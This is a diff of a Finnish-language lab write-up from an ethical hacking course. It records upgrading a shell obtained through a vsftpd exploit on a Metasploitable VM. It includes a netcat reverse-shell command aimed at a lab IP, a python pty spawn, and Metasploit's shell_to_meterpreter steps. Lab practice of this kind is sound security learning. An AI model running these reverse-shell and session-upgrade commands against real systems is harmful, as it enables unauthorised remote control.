@@ -139,21 +139,59 @@ Tämän jälkeen hyökkäsin palveluun exploit komennolla. Kun shell yhteys on s
 ![Alt text](/H3LabKid/h3.f3.png)
 
 ## g) Parempi sessio. Tee vsftpd-hyökkäyksestä saadusta sessiosta parempi. (Voit esimerkiksi päivittää sen meterpreter-sessioksi, laittaa tty:n toimimaan tai tehdä uuden käyttäjän ja ottaa yhteyden jollain tavallisella protokollalla)
+Ensiksi yritin käyttään lähteen 6 netcat:ia saadakseni reverse shellin aikaan, mutta se ei toiminut ja lähteen mukaan tähän voi olla kaksi syytä. 1 netcat ei ole asennettu tukeudutulle palvelimelle tai 2 kaikissa netcat versioissa ei ole -e valintaa olemassa. 
 
+    $ nc -e /bin/sh 192.168.56.101 4444
+![Alt text](/H3LabKid/h3.g2.png)
 
+Joten yritin seuraavaa tapaa joka oli lähteen 6 tapa muuttaa saavutettu sessio pty module:ksi.
 
+    $ python -c 'import pty; pty.spawn("/bin/bash")'
+![Alt text](/H3LabKid/h3.g1.png)
 
+Kuten lähde mainitsi tämä pty module tapa on helppo mutta siinäkin on puutteita, kuten tab-täydennys ei toimi. Joten löysin lähteen 7 tavan muuttaa sessio meterpreter sessioksi. 
+
+Ensiksi CTRL+Z, jotta saadaan nykyinen sessio taustalle. Sitten etsin shell_to_meterpreter msf:stä.
+
+![Alt text](/H3LabKid/h3.g3.png)
+
+    > use 0
+    > show options
+
+ja valitaan taustalla oleva sessio, tässä tapauksessa session 1. Sitten ajetaan se.
+
+    > set SESSION 1
+    > run
+![Alt text](/H3LabKid/h3.g4.png)
+
+Komento sessions -l listaa sessiot ja valitaan sieltä tehty meterpreter sessio.
+
+    > sessions -l
+![Alt text](/H3LabKid/h3.g5.png)
+
+Huomataan, että tehty session on 2. Seuraavaksi suoritetaan tehty sessio komennolla:
+
+    > sessions -i 2
+![Alt text](/H3LabKid/h3.g6.png)
+
+Sain muutettua session meterpreter sessioksi ja nyt olen tyytyväinen.
+
+## h) Etsi, tutki ja kuvaile jokin hyökkäys ExploitDB:sta. (Tässä harjoitustehtävässä pitää hakea ja kuvailla hyökkäys, itse hyökkääminen jää vapaaehtoiseksi lisätehtäväksi)
 
 
 ## Lähteet
-https://terokarvinen.com/2023/eettinen-hakkerointi-2023/
+1 https://terokarvinen.com/2023/eettinen-hakkerointi-2023/
 
-https://rikumannonen935063021.wordpress.com/
+2 https://rikumannonen935063021.wordpress.com/
 
-https://sourceforge.net/projects/metasploitable/
+3 https://sourceforge.net/projects/metasploitable/
 
-https://www.youtube.com/watch?v=aYxfhMrjVhk&ab_channel=RKiLAB
+4 https://www.youtube.com/watch?v=aYxfhMrjVhk&ab_channel=RKiLAB
 
-https://www.geeksforgeeks.org/how-to-install-metasploitable-2-in-virtualbox/
+5 https://www.geeksforgeeks.org/how-to-install-metasploitable-2-in-virtualbox/
+
+6 https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+
+7 https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646
 
 
